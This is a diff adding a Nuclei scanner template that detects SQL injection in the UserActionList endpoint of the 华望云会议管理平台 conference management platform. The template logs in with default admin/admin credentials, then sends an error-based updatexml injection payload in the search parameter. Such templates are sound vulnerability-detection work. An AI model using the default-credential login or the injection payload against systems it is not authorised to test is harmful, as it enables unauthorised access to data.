@@ -1,0 +1,61 @@
+id: hwactive-useractionlist-sqli
+
+info:
+  name: 华望云会议管理平台 UserActionList SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects an SQL injection vulnerability in the 华望云会议管理平台 UserActionList endpoint.
+
+variables:
+  uid: ""
+  cookie: ""
+
+flow: http(1) && http(2)
+
+http:
+  - id: extract-session
+    method: POST
+    path:
+      - "{{BaseURL}}/ajax/userlogin"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      userNameCopy=admin&userName=admin&passWordCopy=admin&passWord=21232f297a57a5a743894a0e4a801fc3
+    extractors:
+      - type: regex
+        name: uid
+        internal: true
+        part: header
+        regex:
+          - "uid=(.*?);"
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - "JSESSIONID=(.*?);"
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, '"success":true')
+
+  - id: test-sqli
+    method: GET
+    path:
+      - "{{BaseURL}}/page/useractionlist?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+md5(1))),1))+and+'%25%25'+like+'&dpId=1&params[]=displayName&params[]=userName"
+    headers:
+      Cookie: uid={{uid}}; JSESSIONID={{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+          - "java.sql.SQLException"
+          - "c4ca4238a0b923820dcc509a6f75849b"
